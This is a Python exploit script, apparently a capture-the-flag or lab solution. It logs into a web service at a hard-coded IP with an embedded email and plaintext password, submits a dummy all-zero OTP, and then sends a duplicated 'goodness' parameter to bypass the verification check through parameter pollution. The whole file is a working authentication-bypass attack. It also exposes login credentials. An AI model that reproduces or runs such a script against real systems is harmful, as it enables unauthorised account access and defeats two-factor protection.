#!/usr/bin/env python3
import urllib.parse
import urllib.request
import http.cookiejar
from urllib.error import HTTPError

BASE = "http://4.188.84.14:4444/"
EMAIL = "manish@iitgn.ac.in"
PASSWORD = "pineapple321"


def post(opener, path, payload):
    data = urllib.parse.urlencode(payload, doseq=True).encode()
    req = urllib.request.Request(
        urllib.parse.urljoin(BASE, path),
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with opener.open(req, timeout=20) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    # 1) Login
    code, body = post(opener, "verify", {"email": EMAIL, "password": PASSWORD})
    if code != 200:
        print(f"Login failed: HTTP {code}")
        return

    # 2) Submit any OTP to move state forward
    otp_payload = {
        "otp_1": "0",
        "otp_2": "0",
        "otp_3": "0",
        "otp_4": "0",
        "otp_5": "0",
        "otp_6": "0",
        "submit": "Verify",
    }
    post(opener, "verify/process.php", otp_payload)

    # 3) Exploit duplicate parameter handling
    code, body = post(opener, "verify/check.php", {"goodness": ["0", "1"]})

    print(f"HTTP {code}")
    print(body.strip())


if __name__ == "__main__":
    main()
